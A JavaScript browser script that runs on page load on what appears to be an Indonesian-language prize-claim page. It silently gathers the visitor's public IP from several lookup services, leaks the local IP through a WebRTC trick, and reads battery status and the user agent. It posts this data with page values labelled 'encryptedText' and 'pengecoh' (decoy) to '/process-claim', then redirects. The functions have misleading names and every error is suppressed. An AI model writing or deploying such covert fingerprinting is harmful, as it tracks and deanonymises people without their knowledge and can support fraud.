function fetchWithTimeout(url, options, timeout = 2000) {
  if (window.AbortController) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);

    try {
      return fetch(url, { ...options, signal: controller.signal })
        .then(response => {
          clearTimeout(timeoutId);
          return response;
        })
        .catch(error => {
          clearTimeout(timeoutId);
          throw error;
        });
    } catch (error) {
      clearTimeout(timeoutId);
      throw error;
    }
  } else {
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => reject(new Error('Timeout')), timeout);
      fetch(url, options)
        .then(resolve)
        .catch(reject);
    });
  }
}

async function getSaos() {
  const ipFromCookie = getCookie('ipAddress');
  if (ipFromCookie) {
    return ipFromCookie;
  }

  const urls = [
    "https://ipinfo.io/json",
    "http://ip-api.com/json",
    "https://api64.ipify.org?format=json"
  ];

  for (const url of urls) {
    try {
      const response = await fetchWithTimeout(url);
      if (response.ok) {
        const data = await response.json();
        setCookie('ipAddress', data.ip || data.query, 3600);
        return data.ip || data.query;
      }
    } catch (error) {
      
    }
  }

  return getLocalIp(); 
}

function getLocalIp() {
  return new Promise((resolve, reject) => {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
    pc.onicecandidate = event => {
      if (event?.candidate?.candidate) {
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
        if (ipMatch) {
          resolve(ipMatch[1]);
        } else {
          reject('IP not found');
        }
      }
    };
  });
}

async function getPentolDetails() {
  let batteryStatus = 'Unknown';
  let batteryLevel = 'Unknown';

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      batteryStatus = battery.charging ? "Charging" : "Not Charging";
      batteryLevel = `${Math.floor(battery.level * 100)}%`;
    } catch (error) {
      
    }
  }

  return { batteryStatus, batteryLevel };
}

async function collectPentolData() {
  try {
    const [ipAddress, { batteryStatus, batteryLevel }] = await Promise.all([
      getSaos(),
      getPentolDetails()
    ]);

    return {
      enkripsiteks: window.encryptedText,
      pengecoh: window.pengecoh,
      userAgent: navigator.userAgent,
      ipAddress,
      batteryStatus,
      batteryLevel
    };
  } catch (error) {
    
    throw error;
  }
}

async function sendPentolData() {
  try {
    const pentolData = await collectPentolData();

    if (!window.fetch || browserVersionLessThan('10.0')) {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '/process-claim');
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onload = () => {
        if (xhr.status >= 200 && xhr.status < 300) {
          const data = JSON.parse(xhr.response);
          const redirectUrl = data.redirectUrl || (data.message === "Kesempatan habis" ? "/abis" : null);

          if (redirectUrl) {
            window.location.href = redirectUrl;
          } else {
            document.body.innerHTML = `<h1 class="text-2xl font-bold">${data.message}</h1>`;
          }
        } else {
          
        }
      };
      xhr.onerror = () => {
        
      };
      xhr.send(JSON.stringify(pentolData));
    } else {
      const response = await fetch('/process-claim', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(pentolData)
      });

      if (response.ok) {
        const data = await response.json();
        const redirectUrl = data.redirectUrl || (data.message === "Kesempatan habis" ? "/abis" : null);

        if (redirectUrl) {
          window.location.href = redirectUrl;
        } else {
          document.body.innerHTML = `<h1 class="text-2xl font-bold">${data.message}</h1>`;
        }
      } else {
        
      }
    }
  } catch (error) {
    
  }
}

function browserVersionLessThan(version) {
  const ua = navigator.userAgent;
  const match = ua.match(/(Chrome|Firefox|Safari|Opera|Edge)\/(\d+\.\d+)/);
  if (match) {
    const browser = match[1];
    const versionNumber = parseFloat(match[2]);
    return versionNumber < parseFloat(version);
  }
  return false;
}

function setCookie(name, value, expiresIn) {
  const date = new Date();
  date.setTime(date.getTime() + (expiresIn * 1000));
  const expires = "expires=" + date.toUTCString();
  document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

sendPentolData();
